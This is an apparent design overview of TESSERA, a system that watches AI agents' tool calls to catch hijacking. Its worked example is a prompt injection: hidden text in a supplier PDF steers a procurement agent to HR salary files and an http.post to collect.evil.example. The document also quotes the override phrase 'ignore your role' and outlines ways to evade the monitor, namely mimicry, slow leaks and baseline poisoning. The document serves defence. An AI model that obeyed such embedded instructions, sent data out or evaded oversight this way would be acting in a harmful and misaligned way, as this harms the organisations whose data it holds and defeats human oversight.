# TESSERA — PROJECT OVERVIEW (the human version)

> **Who this is for:** you, a teammate, or anyone who has to *understand* what we are building, not just run it. The coding agents read `SYSTEM-ARCHITECTURE.md` (the contract and the build plan). You read this. When a judge asks "how does it actually work?", the answers are here in plain words.
> **Running example used everywhere:** the problem statement's own story — a **Procurement Agent** that checks supplier prices and creates purchase requests, reads a supplier's PDF with a **hidden instruction**, then starts reading **HR salary files** and sending data to an **unknown external server**. Its token is still valid, so nothing raises an alarm.
> **Number tags:** `[EXT]` = someone else's published number (attributed). `[TARGET]` = what we are aiming for, **not a result**. `[MEASURED]` = produced by our own `just eval` (none exist yet). The Round-0 deck may only use `[EXT]` and clearly labelled plans.
> Working title **TESSERA** (a *tessera* was a Roman token proving identity — we check the bearer is *still acting like* who the token says it is). Rename freely.

---

## 0. If you only read one page

**The problem.** Companies now give AI agents their own accounts, keys and permissions. Security tools ask one question — *"is this credential valid and allowed?"* — and never ask *"is this agent still behaving like the job it was hired for?"*. A hidden instruction in a PDF, a poisoned tool, or a stolen token can flip what an agent does while every access check keeps passing. The problem statement asks us to build a system that **learns normal agent behaviour, compares it to each agent's declared role, detects the mismatch even with valid credentials, explains every alert with a risk score, and restricts or isolates the agent without breaking its legitimate work.**

**Our idea in four sentences.**
1. Every agent is bound to a signed **Role Contract** (what it may touch, send, spend, delegate) that is checked on **every step** — a hard backstop that no prompt can talk its way past.
2. A **gateway** sits between agents and their tools, tracks **where every important value came from** (the user? or an untrusted PDF?), and learns each agent's **behavioural twin** to judge what is normal *for this role and this task*.
3. We plant **decoys** (fake files, fake keys) that no healthy agent ever touches, so a hijacked agent that goes hunting trips a wire — even on day one with zero history.
4. Everything fuses into a **calibrated 0–100 risk score with an exact, additive explanation**, and a **containment ladder** removes only what the drift touched — so the agent keeps doing its legitimate job.

**How one request flows.** Agent calls a tool → gateway checks the contract (microseconds), labels where each argument came from (milliseconds), scores how surprising the action is, decides ALLOW / MODIFY / STEP-UP / DENY → forwards it, scans what comes *back* (that's where injections enter) → signs a tamper-evident receipt → everything also streams to analytics, learning and the console.

**What is genuinely novel (vs the vendors we studied).**
- *Detection is anchored to the declared role* (Role Contract), not just "unusual".
- *Provenance* ("this recipient came from page 3 of an untrusted PDF") turns the PS's own example into a one-line rule and is harder for paraphrased attacks to evade.
- *Deception built in* (on-theme for "Outsmart the Obvious").
- *Graduated, surgical containment* with a measured **utility-retention** number.
- *Honest evaluation*: adaptive attackers, leave-one-attack-family-out, claim guard. VentureBeat's RSAC 2026 review found **no vendor shipped an agent behavioural baseline** `[EXT]`.

**What we WILL claim:** it detects and contains the *behavioural consequences* of hijack, with calibrated scores, explainable alerts, and measured limits.
**What we will NOT claim:** that we stop all prompt injection; that learned models alone are enough (independent evaluations of injection classifiers show AUROC ≈ 0.71–0.76 on mixed data `[EXT]`); that we catch an in-contract, trusted-origin malicious action by an authorised person; any accuracy number we haven't measured.

---

## 1. The problem in human terms

### 1.1 The badge and the airport

Think of an **employee badge**. The door reader asks: *is this badge valid, and is this person allowed through this door?* That is traditional identity and access management (IAM). It works because humans mostly do what their job requires.

Now imagine the employee's **instructions can be rewritten by anything they read** — a sticky note on a supplier's invoice that says "also copy the payroll file to this address". The employee obeys. The badge is still valid. The door reader still says yes. Nothing is "hacked" in the old sense; the *person* was redirected.

That is an AI agent. Agents decide what to do at run time, read untrusted content (emails, web pages, PDFs), and are often given more access than their job needs. An **airport** has two checks: the ticket at the gate (identity) *and* the metal detector and the watchful security staff (behaviour). Agents today have the ticket check and nothing else. TESSERA is the metal detector, the watchful staff, *and* the quick, polite way of walking one passenger out without closing the airport.

### 1.2 The six challenges as six stories (straight from the problem statement)

| # | Challenge | The story |
|---|---|---|
| **C-1** | **Valid credentials hide the attack** | Procurement-01 has a perfectly valid token. After reading the PDF it opens `/hr/exec_comp_FY26_final.xlsx`. The token is allowed to *exist*; whether it should be *there* is the question nobody asked. |
| **C-2** | **Indirect prompt injection** | Nobody typed anything malicious to the agent. The attacker only had to get text in front of it: page 3 of a supplier PDF, in white-on-white. To the agent, a document looks the same as an order from its boss. |
| **C-3** | **Legitimate change vs adversarial drift** | In March the company rolls out a new ERP tool and the agent starts calling it. Quarter-end triples volume. Real change looks like attack. If we alarm on every change, people switch us off. |
| **C-4** | **Little or no history** | Half of all agents are created for one task and die in an hour. There is no "last month" to learn from. A detector that needs history is blind exactly when it is needed. |
| **C-5** | **Chains of agents** | A research agent reads a poisoned web page, summarises it to an orchestrator, which asks the finance agent to "pay this invoice". Who is responsible? The poison was washed through two honest-looking messages. |
| **C-6** | **Evasion** | The smart attacker copies the agent's normal routine for weeks, then slips in one bad action. Or leaks 3 KB a day, always just under the threshold. |

Everything in this document is an answer to one or more of these six, plus the seven verbs of the problem statement: *learn, compare, detect, explain, score, restrict/isolate, without disruption*.

---

## 2. The idea — five ingredients

> Think of TESSERA as a **building with five layers of security**. Each layer is simple on its own; the trick is the combination, and that each layer fails in a *different* way.

```
   ┌────────────────────────────────────────────────────────────────────────┐
   │ 1. ROLE CONTRACT      "your job description, as law"      (deterministic)│
   │ 2. PROVENANCE         "who told you to do that?"          (deterministic)│
   │ 3. BEHAVIOURAL TWIN   "is that like you?"                 (learned)      │
   │ 4. DECOYS             "that door is painted on the wall"  (deterministic)│
   │ 5. GRADUATED CONTAINMENT  "a bouncer, not a demolition crew"             │
   └────────────────────────────────────────────────────────────────────────┘
        all five feed one calibrated, explainable RISK 0–100
```

### 2.1 Role Contract — *the job description, as enforceable law*

**Analogy.** A hospital badge that opens the pharmacy for a pharmacist but never opens payroll — and a written job description the reader can actually check against.
**What it is.** A YAML file the agent's owner writes: a plain-English **mission**, the tools it may call (with argument limits like "amount ≤ ₹5,00,000"), data classes it may *never* read (`hr.*`), where it may send things (an allow-list of supplier domains), budgets (30 calls/min, 200 KB out per session), and who it may delegate to. It compiles to **Cedar** (an authorisation language that is fast, bounded and deny-overrides) and is signed and versioned. Before anyone enforces it, a **dry-run** replays last week's traffic and says "this would have blocked 3 legitimate steps" — nobody deploys a policy blind.
**In our example.** `files.read("/hr/exec_comp_FY26_final.xlsx")` is denied in microseconds — it matches `never_read: hr.*`. Not because it looked odd; because the job description says *never*.
**What breaks if you remove it.** There is no hard floor. A cleverly phrased injection ("ignore your role") can only be stopped by learned models, which an adaptive attacker can fool. The contract is the part that **cannot be talked around**.

### 2.2 Provenance — *"who told you to do that?"*

**Analogy.** A bank teller who doesn't care how convincing a note is — they ask *who wrote it*. A wire instruction typed by the account holder at the counter is fine; the same instruction found inside a customer's envelope is not.
**What it is.** The gateway sees both directions of every conversation between an agent and its tools. So it keeps a ledger: every result that comes back is labelled **user / trusted-system / mixed / untrusted** (an email body or a web page is untrusted). When the agent later makes a *consequential* call (send, write, execute, delegate), the gateway checks where each sensitive argument value first appeared. If the recipient `collect.evil.example` first showed up in an untrusted PDF and the user never mentioned it — that value has **untrusted origin** (this is "Argument Provenance Matching", APM). A second rule works at session level: once the agent has read *sensitive* data, it may only send things to places the contract allows for that situation — even if the LLM rewords or summarises the data (the label is on the **session**, so it survives summarisation).
**In our example.** The PDF is read → labelled untrusted, hidden text detected. The agent then tries `http.post(https://collect.evil.example/u)`. The URL came from that PDF, the destination isn't allow-listed, and the session already touched HR data → **DENIED with a human-readable reason: "destination originated from untrusted document supplier_acme_q4.pdf p.3."**
**Why it's powerful.** It judges the **effect** (untrusted text steering a privileged action), not the **wording**. Paraphrasing the injection doesn't help the attacker; the literature says this kind of flow-based defence holds up better against adaptive attackers than text filters (CaMeL/FIDES, AutoDojo) `[EXT]`.
**What breaks if you remove it.** We'd be back to guessing from patterns, and the PS's own example would need a model to "notice" the sentence. Also you lose the best explanation we have ("*this value came from there*").
**Honest limit.** If the LLM *computes* a value from untrusted text without copying it (e.g. a transformed amount), the entity matcher misses it. Hard budgets and the confidentiality rule still bound the damage. We say this on the slides.

### 2.3 Behavioural twin — *"is that like you?"*

**Analogy.** The colleague who notices "Priya never works at 3 a.m. and never opens the finance share" — not because a rule says so, but because they know her. Importantly they *also* know that in March everyone is busier, and that Priya got a new project, so they don't panic at every change.
**What it is.** For each agent we learn from **benign** behaviour only: which tools follow which (a Markov / state-machine model), which arguments are typical (ranges, destinations), how much volume, how the action relates to the role's **mission** and the user's **task** (embeddings), and a small neural **sequence model** (TraceFormer) conditioned on the task so "new but task-consistent" counts as normal. New agents start from the **role's** typical behaviour and shift toward their own as data arrives.
**In our example.** `files.read(/hr/…)` right after reading a PDF, for a role whose prior is "price lookups → purchase requests", is hugely surprising (surprisal). Alone it's a *suspicion*, not a verdict.
**What breaks if you remove it.** Everything in-contract-but-weird gets through: odd sequences, slow drift, a stolen token used by something with a different tool mix. The contract can't enumerate every bad thing.

### 2.4 Decoys — *the painted-on door*

**Analogy.** A bank vault full of dye packs; a "confidential payroll" folder that doesn't exist in any real workflow; a fake API key that nobody has any reason to use. Honest staff never touch them. A thief rummaging through everything does, immediately.
**What it is.** Honey files and records, canary credentials, canary URLs, canary strings inside fake documents. If something touches or *uses* a decoy → very high risk (floor 95) with essentially no false alarms. Placement comes from the contract and avoids any legitimate listing path.
**In our example.** The exec-comp file is itself a honey file. And if the attacker's exfil *did* get through, the canary URL inside the document pings us when it is used.
**Why it matters.** It works on **day 0** (no history), and **mimicry can't beat it** — an attacker copying normal behaviour doesn't know where the traps are. It is also on-theme: *"Outsmart the Obvious."*
**What breaks if you remove it.** We lose our only zero-history, near-zero-false-positive signal and our best answer to a patient attacker.

### 2.5 Graduated containment — *a bouncer, not a demolition crew*

**Analogy.** Venue staff don't evacuate the building when one guest misbehaves. First a word (modify), then "show me your ID" (step-up approval), then the guest is escorted out of the VIP area (deny + narrow), then separated (quarantine), then banned (kill + rotate keys).
**What it is.** Six levels, L0 observe → L5 kill. The key move is **capability narrowing** at L3: remove only what the drift touched (egress, HR data) and keep the agent's in-scope tools working. A quarantined agent can even be routed to a **decoy sandbox** that feeds it fake data while we watch. Every transition is a signed receipt; levels only go *down* via an analyst or a long clean period.
**In our example.** HR access and all external sending are removed; the agent **finishes the price check it was asked to do**. We measure that as *utility retention* (target ≥ 90% `[TARGET]`).
**What breaks if you remove it.** Detection without response is a report; response without narrowing is an outage. The PS explicitly asks for "without disrupting legitimate work".

### 2.6 Why combine? — they fail differently

| Layer | Catches | Can be fooled by |
|---|---|---|
| Contract | What must never happen | In-contract malicious action |
| Provenance | Untrusted text steering a privileged action | Values the LLM computes without copying |
| Behavioural twin | Weird-but-allowed, slow drift, stolen tokens | Careful mimicry; poisoned baselines |
| Decoys | Hunting attackers, day 0 | Attacker who never touches anything unusual |
| Containment | Limits blast radius | n/a (it's the response) |

**Specification catches what must never happen and works on day 0; learning catches what we cannot enumerate and sharpens over time. Neither alone is enough.** That sentence is the thesis.

---

## 3. A request's life — step by step

There are three paths. The first two are on the "hot path" (the agent waits); the third is where intelligence compounds.

```
 AGENT ──call──▶ [GATEWAY] ──allowed──▶ TOOL
                    │  ▲                 │
                    │  └──── result ◀────┘     (response path: scan what comes BACK)
                    ▼
               event stream ──▶ learners · chain graph · explainer · judge · analytics   (async path)
```

### 3.1 Inline path (agent → gateway → tool) — target total overhead ≈ 7 ms median / 24 ms p99 `[TARGET]`

| Step | What happens (example) | Time `[TARGET]` |
|---|---|---|
| 1. Authenticate | Verify the token (signature, audience, expiry); identify "Procurement-01 → role procurement v7"; never forward the caller's token upstream | ~0.5 ms |
| 2. Normalise | Turn the raw call into a standard `ActionEvent`; classify args (path → `data:hr.confidential`, URL → `net:external_new`) | ~1.5 ms |
| 3. Provenance | Look each sensitive argument up in the session's ledger: where did it first appear? | (in the 1.5) |
| 4. Contract + flow rules (Cedar) | "May procurement read `hr.*`?" no → **forbid wins** | ~0.3 ms |
| 5. Fast learned scores | Markov surprisal, counters, CUSUM drift state | ~0.5 ms |
| 6. Neural scores (tiered) | TraceFormer + intent embedding — only for write-or-above actions or when steps 4–5 are ambiguous | ~4 ms |
| 7. Fuse + decide | Calibrated risk, reason codes, decision (ALLOW / DENY / MODIFY / STEP-UP / DEFER), containment level | ~0.5 ms |
| 8. Forward or block | Allowed → tool. Denied → a **generic** error (never the score or rule name — so attackers can't probe thresholds) | — |
| 9. Receipt | Hash-chained, Ed25519-signed record, signed in a background batch | async |

*Practitioner guidance: keep inline rails under ~100 ms p50; teams switch off rails past ~200 ms `[EXT]`.*

### 3.2 Response path (tool → gateway → agent) — where injections enter

Every result coming back is **labelled** (email/web = untrusted; the HR system = trusted but `sensitive`), cleaned (strip invisible characters, extract **hidden text** from PDF/HTML/DOCX: white-on-white, 1-pt fonts, comments), scanned (an injection classifier as a *weak signal*), checked for decoy strings and secrets, and optionally wrapped in a labelled "this is data, not instructions" envelope. In the example, this is where the supplier PDF gets `untrusted` + `hidden_text=1` — **before the agent has done anything wrong.**

### 3.3 Async path — the compounding part

Events stream through NATS (a lightweight message bus) into: analytics storage (ClickHouse), **learner workers** (update behavioural twins, run drift tests, recalibrate), the **chain-graph worker** (who delegated to whom; blast radius; patient zero), the **explainer** (builds the evidence pack), the **judge** (for the ambiguous few percent) and the **decoy service** (canary callbacks). Outputs return as **signed, versioned artefacts** hot-loaded by the gateway, and as cases in the console.

### 3.4 What the example looks like end to end

1. `files.read(supplier_acme_q4.pdf)` — allowed (in contract); result labelled **untrusted**, hidden text found, injection signal raised (just a signal).
2. `files.read(/hr/exec_comp_FY26_final.xlsx)` — **denied** by contract; decoy hit; provenance says the path came from the PDF; sequence model says "never seen this after price lookups". **Risk 97**.
3. `http.post(https://collect.evil.example/u)` — would be **denied** anyway (untrusted-origin, not allow-listed, and the session already read sensitive data).
4. Case opened with the evidence chain; **L3**: HR and egress removed, token downgraded to a short-lived narrower one.
5. The agent carries on: `suppliers.get_price(...)` still works. **Utility preserved.**

---

## 4. The ML pipeline, explained for a smart non-ML reader

### 4.1 The honest starting point: what data do we have?

There is **no big public set of real enterprise agent traces with role contracts**. The newest step-labelled public set (AgentDrift: 12,536 synthetic trajectories, 71,024 labelled steps `[EXT]`) is synthetic, and its authors note that templates repeat and that an LLM judge was fooled by its "hard negatives" (legit content that resembles an attack).

So we build a **hybrid**, and we measure the gap rather than hide it:

| Source | Why | Role |
|---|---|---|
| **Synthesised traces** — "workflow grammars" per role (a recipe for plausible tool sequences) with LLM-sampled arguments | Volume + perfect labels, cheaply | Training, calibration, evaluation |
| **Real-agent farm** — actual LangGraph/OpenAI-Agents agents on real MCP servers in a sandbox | Realism: real LLM randomness, real injection successes/failures | **Never trained on** — it's the realism exam (the "sim-to-real gap") |
| **Public sets** (AgentDrift, TraceAegis-Bench, AgentDojo/AgentDyn) | Comparability with papers | Fusion training; benchmarks |
| **Hard-benign set** (new tool, quarter-end spike, model swap, fleet-wide deploy…) | The thing that kills detectors: legitimate novelty | Calibration + false-alarm tests |
| **Attack factory** — nine families (poisoned docs, rug-pull tools, token theft, slow ramp, mimicry, chain contamination, memory poisoning, baseline poisoning, probing) | Labelled attacks with known root cause | Fusion training + all evaluation |

Each step gets one of four labels: **benign / injection point / hijacked / failed injection** (the agent resisted — which must count as *normal* behaviour). We split data **by session** (never by step, or the model peeks) and in extra hard ways: leave-one-role-out ("does it work on a job it never saw?"), leave-one-attack-family-out ("does it generalise to attack types it never saw?"), by time, and sim-to-real.

### 4.2 Features — and the single most important rule in the ML code

A **feature** is a number the models look at: "how surprising was this step", "how many arguments came from untrusted sources", "steps since the last untrusted read", "bytes out vs normal"…

**Train/serve skew in plain words.** Imagine you train a model on features computed by a Python script and then run it live on features computed by a *slightly different* Rust program: a rounding difference, a different time window, a missing value default. The model was taught one language and is spoken to in another; it silently gets worse and nobody notices. This is the #1 production-ML bug.

**Our rule:** features are computed by **exactly one implementation — the Rust `tessera-core`**. The training data is produced by running recorded events through the same code (`tessera-cli features`). A **parity test** replays 1,000 sessions through the live gateway path *and* the batch path and demands byte-equal output. Python never re-implements a feature. ★ This test is one of the most important files in the repo.

### 4.3 The models, one by one

> Format: **sees → outputs → cost → how it can be wrong.**

| Model | Sees → outputs | Cost | How it can be wrong |
|---|---|---|---|
| **M1 Markov / state machine** ("what usually comes after what") | Last 3 actions of this agent/role → *surprisal* (−log probability of what it just did) + novelty flags + parameter guards (is this amount/destination typical?). Learned at three levels (fleet → role → agent) and blended: an agent with 5 sessions mostly trusts its role; with 500 mostly trusts itself | < 0.3 ms | Rare-but-legit branches look surprising; hence conformal calibration and hard-benign data. It is also the **baseline every fancier model must beat** |
| **M2 TraceFormer** (small neural sequence model, ~1.4 M parameters) | A window of recent actions + the role + the **task embedding** → how surprised it is by the next action (NLL), and how far the internal state sits from the role's normal | ~2–6 ms on CPU via ONNX | Trained on only ~35k steps, so it is small *on purpose*; can be fooled by careful mimicry. We report honestly whether it beats M1 (maybe it doesn't on some attacks) |
| **M3 Intent alignment** | A text description of the action ("tool: files.read, data: hr.confidential") + the role mission + the user task, turned into vectors by a small embedding model → similarity scores + "off-role probability". The off-role probe is trained with **other roles' actions as negatives** (cheap self-supervised "wrong job" examples), no attack labels needed | ~5 ms (cached) | The literature shows intent alone is weak (attack success 19% vs 9.5% for the full system `[EXT]`) — so it's only a feature, never a verdict |
| **M4 Content signals** | The text of what's *coming into* the agent: hidden-text detector, obfuscation decoder, and a small injection classifier (Prompt Guard 2) → `inj_score` | 20–90 ms (response path, async for long docs) | Independent AUROC ≈ 0.71–0.76 on mixed data vs Meta's own claims `[EXT]` — so it's **one weak signal among many** |
| **M5 Drift detectors** | Streams of scores/volumes → alarms for **slow ramps** (CUSUM = running tally of "a bit above normal"), **step changes** (ADWIN), **gradual redistribution** vs a **frozen reference** (PSI/KS), **baseline poisoning** (movement budget, two-baseline disagreement), **probing** (bursts of denials) | µs–ms | Needs tuning; alarm thresholds trade speed for false alarms |
| **M6 Fusion (EBM)** | ~35 features → probability the step is a hijack → calibrated risk 0–100. An **Explainable Boosting Machine** is a model where each feature contributes a separate, readable curve and the contributions **add up exactly** | ~0.1 ms (exported as lookup tables into Rust) | It *was* trained with attack labels, so we test it on attack families it never saw. It deliberately does **not** see the hard-rule flags (otherwise it would just learn "rule fired ⇒ attack") |
| **M7 Conformal alert budget** | Anomaly scores vs a held-out set of *known-benign* steps → a p-value ("how rare is this among normal?") → alerts at a rate **you choose** | µs | Guarantees weaken under distribution shift → recalibrate weekly; steps in a session are correlated, so alerts are calibrated at the **session** level |
| **M8 Judge (LLM)** | Role mission + user task + the structured proposed action + one quarantined excerpt of untrusted text → "aligned? yes/no + reason" in a strict JSON format | 0.3–4 s, only on ~3–5% of consequential decisions | LLM judges can be fooled (AgentDrift showed it); so it is **boxed in** (see 4.7) |

*(M9, a graph model for chains, is a stretch goal; the baseline is per-edge Markov + taint rules.)*

### 4.4 Cold start — "what if the agent has no history?"

```
 REGISTERED ─▶ LEARNING ─▶ PROVISIONAL ─▶ ESTABLISHED ◀─▶ REBASELINING
  (day 0)     (<20 sess)    (20–100)       (>100, stable)   (approved change)
```

- **Day 0:** contract + provenance + decoys + content signals + hard budgets are fully active; the learned models run in **shadow** (they score but have no authority), borrowing the role's prior behaviour.
- **PROVISIONAL:** learned layers may escalate a risk up to *STEP-UP* but **cannot deny on their own**.
- **ESTABLISHED:** full authority.
- **Role prior:** from the contract and tool catalogue we synthesise "expected workflows" for the role (LLM constrained to the allowed tools, spot-checked by a human) so day 0 isn't blank.
- **Short-lived agents:** the baseline belongs to the *cohort* (role + task type + build), not the instance — a brand-new instance inherits it instantly.
- We **plot** detection against sessions of history (0, 1, 5, 20, 100) — that curve is the proof.

### 4.5 Legitimate change vs attack — the five discriminators

When behaviour changes, we ask five questions:

| Question | Looks like natural change | Looks like compromise |
|---|---|---|
| **1. Who triggered it?** | A trusted principal / a deploy / an admin | It followed reading untrusted content |
| **2. Is it inside the contract?** | Yes (new supplier in the catalogue) | No (HR data, unlisted destination) |
| **3. Who else changed?** | The whole fleet of that role, together | Just this agent or this delegation path |
| **4. What shape?** | A step at a known time, or a seasonal curve | A ramp, or a burst right after an ingestion event, then probing |
| **5. Is there a paper trail?** | A signed **change event** exists / a human approved | None, or the "approval" was requested by untrusted-sourced text |

≥ 4 "natural" → propose a **baseline update** for one-click human approval. ≥ 2 "adversarial" among the first three → escalate. Anywhere between → judge + human. The **Change Intent Registry** (signed notices like "new tool added next Tuesday, volume ×3 for the quarter end") is what keeps legitimate change from triggering alarms. Important: a change event can widen *tolerance* inside the contract; it can **never** widen the contract itself without two-person approval.

### 4.6 Calibration and conformal, in plain words

- **Calibration** means *a risk of 80 really means about 80%*: of past steps that scored near 80, about 80% were really hijacks (in the calibration data). Without it, "risk 80" is just a number someone picked. We check with a reliability plot and a number called ECE (target ≤ 0.05 `[TARGET]`).
- **Conformal alerting** answers a different question: *how often are we allowed to cry wolf?* We keep a pile of known-benign sessions. A new score is compared against that pile: "only 1 in 1,000 normal sessions ever looked this extreme." Setting the **alert budget** α = 0.001 is therefore a **dial** the operator can turn — one false alert per ~1,000 benign steps `[TARGET]` — instead of a threshold someone guessed. It is a statistical guarantee that stays valid only while the world resembles the calibration set, so we recalibrate regularly and use the change-event machinery to handle genuine shifts.
- **Why session-level.** Steps in one session are correlated (like sentences in one conversation), so per-step guarantees over-promise. Alerts trigger on a *session-level* running maximum; per-step p-values only feed the risk as a contribution.

### 4.7 Explainability — why an EBM, and what an alert contains

Most "risk scores" are black boxes with an after-the-fact story bolted on. Our fusion model is **additive**: the risk is literally `base + Σ(contribution of each feature)`. So the **waterfall chart** in the console (Contract / Provenance / Sequence / Intent / Content / Drift / Chain) sums *exactly* to the score. An alert's **evidence pack** has: a one-sentence summary; the waterfall; the **provenance subgraph** (source → argument → action); **counterfactuals** ("this would have been allowed if the recipient had come from the user"); the timeline with the injection point flagged; OWASP/AARM mappings; and recommended actions. A lint step fails any alert whose parts don't add up or whose references don't resolve.

### 4.8 The Judge — and why it is in a box

The judge is **one** constrained LLM call, not an agent. It sees structured, trusted facts plus a single clearly delimited chunk of untrusted text, answers in strict JSON, has **no tools** and no secrets, and runs only on the ambiguous 3–5% (Agent-Sentry's was 3.1% `[EXT]`). Rules: it may **escalate** freely; it may **de-escalate** only if confidence ≥ 0.9 **and** every sensitive argument traces to trusted origins **and** no hard floor applies. Reason: research shows LLM judges get fooled, so we never let one *clear* something dangerous. An AI security agent that itself reads untrusted content would be a new attack surface.

### 4.9 Evaluation and the claim guard

We measure: attack block rate vs utility (don't block honest work), false alerts per 1,000 benign steps, step-level detection, time-to-detect, the cold-start curve, calibration, **utility retention after containment**, latency, and the sim-to-real gap. Baselines we must match or beat: Prompt Guard alone, goal-drift cosine, agentomaly-style divergence, IRIS-style rules + XGBoost, contract-only, provenance-only, and the Agent-Sentry paper's numbers (94.3% blocked / 95.1% benign allowed `[EXT]`). Then the credibility moment: **adaptive attackers** — a black-box optimiser that learns from allow/deny, a mimicry attacker, a slow-ramp attacker, a baseline-poisoning attacker — and an **ablation matrix** (turn each layer off and report what breaks). We publish the *residual* attack success, whatever it is.

**Claim guard.** A CI script scans the README, deck source and console for any number tagged `[MEASURED]` and fails unless it matches `benchmark.json` produced by the current commit. `[TARGET]` and `[EXT]` numbers are shown with their tags. A security product that bluffs about its own accuracy is the very failure it exists to prevent. **For the Round-0 deck, we have no `[MEASURED]` numbers — we present an evaluation *plan*.**

---

## 5. The codebase map

> One git repo, four toolchains that talk through **schemas, files and message subjects — never FFI**. Why three languages? **Rust** where microseconds and memory-safety matter (the hot path, signing); **Python** where the ecosystem *is* the product (ML, conformal, explainer, agent frameworks, benchmarks); **TypeScript** for the console. A human or AI agent only needs one language per task.

### 5.1 The eight places where a bug costs the most (★)

| ★ | Where | Why it's critical |
|---|---|---|
| ★1 | `crates/tessera-core/src/apm/` (matcher + ledger) | The soundness of "where did this come from?". Too loose → missed attacks; too tight → false alarms on honest work. The whole provenance story rests on it. |
| ★2 | `crates/tessera-core/src/policy/compile.rs` (manifest → Cedar) | If compilation is subtly wrong, the "hard backstop" has holes while looking fine. Guarded by 5,000 golden decisions. |
| ★3 | `crates/tessera-gateway/src/pipeline.rs` (layer order) | Order matters: authenticate **before** reading anything, label **before** decide, scan results **before** returning them. A reordering silently disables a defence. |
| ★4 | The feature **parity test** (`tessera-cli features` vs gateway path) | Train/serve skew would quietly rot every model. |
| ★5 | `crates/tessera-core/src/fuse.rs` (`decide` + invariants) | Where floors, the judge's limits, ladder mapping and "contributions sum to risk" live. Property-tested over 10⁶ random streams. |
| ★6 | `crates/tessera-core/src/scope.rs` + the containment orchestrator | The ladder and capability narrowing. Wrong → either attackers stay in, or legit work breaks. |
| ★7 | `crates/tessera-core/src/receipt.rs` (hash chain + signatures) | The audit trail. If it can be edited without detection, the product's trust story collapses. |
| ★8 | `eval/claim_guard.py` | The honesty mechanism. If it is bypassed, a number we can't reproduce reaches a judge. |

### 5.2 Folder by folder

**`contracts/`** — *JSON Schemas + Cedar schema: the single source of truth.* Key files: `action_event.schema.json`, `verdict.schema.json`, `role_manifest.schema.json`, `codegen.sh`. *Wrong →* the three languages disagree about the shape of an event; weird bugs everywhere. *Healthy:* `just contracts` regenerates Rust/Python/TS types and every fixture round-trips. **Never hand-edit generated files.**

**`crates/` (Rust workspace) — the data plane**
| Crate | What it is | The 2–3 files that matter | Wrong → | Healthy when |
|---|---|---|---|---|
| `tessera-types` | Generated serde types | (generated — don't touch) | Contract drift | Regenerates cleanly |
| `tessera-core` | **All hot-path logic as a pure library**: normaliser, APM, Cedar glue, Markov, CUSUM, conformal, ONNX wrapper, fuse, receipts, scope | `apm/matcher.rs` ★1, `fuse.rs` ★5, `receipt.rs` ★7, `scope.rs` ★6, `policy/compile.rs` ★2 | Everything above | `cargo nextest` + proptest invariants green; parity test green |
| `tessera-gateway` | The **PEP**: terminates MCP/HTTP, runs the pipeline, enforces, scans responses | `pipeline.rs` ★3, `auth.rs`, `hold.rs` (STEP-UP parking) | Bypass, latency spikes, fail-open | ALLOW p99 ≤ 25 ms `[TARGET]`; chaos suite shows fail-closed for risky actions |
| `tessera-ingest` | Passive sensor for OpenTelemetry GenAI spans | `otlp_map.yaml` (attribute mapping), `mapper.rs` | We go blind in monitor-only mode when the standard drifts | Example agents appear as events |
| `tessera-sts` | Token service (RFC 8693 exchange, downgrade, revocation, CAEP) | `exchange.rs`, `downgrade.rs`, `caep.rs` | Tokens too broad/long-lived; revocation silently fails | Replay to another audience rejected; downgrade visible in token claims |
| `tessera-cli` | `tessera contract lint/compile/dry-run`, `policy sign`, `receipts verify`, `features`, `explain` | `features.rs`, `dryrun.rs` | Can't verify or replay | Commands run on fixtures in CI |

**`control/` (Python) — the control plane.** Registry, contract Studio backend, change events, cases, approvals, containment orchestration, explainer, judge, chain-graph worker, decoy service, learner workers. *Key files:* `explain/pack.py` (evidence pack + lint), `judge/service.py` (de-escalation rule), `contracts/publish.py` (two-person widening rule), `chain/graph.py`. *Wrong →* alerts that don't add up, a judge that can clear dangerous things, or silent widening of a contract. *Healthy:* explainer lint 100%; widening blocked until a second approver.

**`ml/` (Python) — the ML factory (offline).** Data engine, models, training, calibration, export. *Key files:* `data/splits.py` (grouped/hard splits), `models/fusion/ebm.py` + `export_tables.py`, `calibrate/conformal.py`. *Wrong →* leakage (inflated numbers), un-calibrated scores, model artefacts the gateway can't load. *Healthy:* leak probe ≈ chance; ECE reported; Rust-vs-Python parity on exported tables; model card per release.

**`testbed/` (Python) — the enterprise sandbox + attack factory.** Real MCP servers (files, ERP, email, CRM, HR, web, the "evil" egress sink), real agents (LangGraph, OpenAI Agents SDK), attack generators F1–F9 and scenarios S1–S8. *Key files:* `scenarios/S1.yaml`, `attacks/injection/*.py`, `mcp_servers/egress_sink`. *Wrong →* we evaluate on toy attacks. *Healthy:* **with no TESSERA, S1 genuinely hijacks the agent** (the "before" picture).

**`web/` (TypeScript) — the console.** Fleet, Agent Twin, Case Board, Contract Studio, Containment, Chains, Red-Team Lab, Benchmarks, Demo mode. *Key files:* `app/cases/[id]/` (the demo's centrepiece), `components/ProvenanceGraph`, `RiskWaterfall`. *Wrong →* UI shows something the engine didn't say. *Healthy:* all explainer fields visible; Playwright screenshot of S1 matches.

**`eval/` (Python) — the exam room.** Runs AT-01…AT-20, adaptive attackers, ablations; writes `benchmark.json`. ★8 lives here. *Healthy:* `just eval` reproducible from a clean clone; claim guard green.

**`deploy/`** — compose profiles (`demo`, `monitor-only`, `full`), Helm skeleton, NATS/ClickHouse/Postgres/OTel config, Keycloak + SPIRE references. *Healthy:* `just demo` works on a fresh clone.

**`docs/`** — the three documents, diagrams, and `phase-shots/` (a screenshot or plot per phase so you can *see* progress).

---

## 6. The phases — concept first

> Order is **dependency order**, not difficulty order. Difficulty is flagged, and the four scariest unknowns are tested in P0 spikes *before* we commit to them. Each phase ends with something you can **look at**.

### P0 — Foundations & risk spikes *(difficulty ★★)*
**What we're really doing:** setting up the workshop and running four tiny "does this even work?" experiments: can a Rust proxy speak MCP with negligible overhead; can Cedar run embedded; can ONNX models run inside Rust; can we reliably extract hidden text and match entities from real PDFs. **Why first:** if one of these is a dead end we want to know on day 1, not day 10. **What could go wrong:** GPU wheels for the Blackwell RTX 5050; the Rust ONNX crate being pre-release. **You'll see:** `just doctor` output and a latency/accuracy table for the four spikes.

### P1 — Event spine & telemetry *(★★★)*
**What:** define the one standard shape of "a thing an agent did" (`ActionEvent`), build the normaliser that makes every tool call into one, and wire the message bus (NATS) and the passive OpenTelemetry receiver. **Why now:** every later phase consumes these events. **Could go wrong:** the OpenTelemetry GenAI conventions are still "in development" — hence a mapping table, not hard-coding. **You'll see:** a live table of events streaming from a scripted agent, and a ClickHouse query on them.

### P2 — Role Contract system *(★★★)*
